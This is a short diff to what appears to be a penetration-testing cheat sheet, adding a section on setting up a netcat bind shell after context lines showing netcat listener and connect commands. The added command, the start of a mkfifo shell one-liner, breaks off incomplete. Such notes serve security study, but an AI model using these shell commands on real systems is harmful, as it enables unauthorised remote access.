@@ -18,3 +18,8 @@ nc -lnvp <PORT>
 nc -nv <TARGET IP> <PORT>
 ```
 
+## Establishing Basic Bind Shell to Interact with Basg
+
+#### 1) Put a bash shell on the TCP session
+```rm -f /tmp/f; mkfifo /tmp/f; cat 
+```
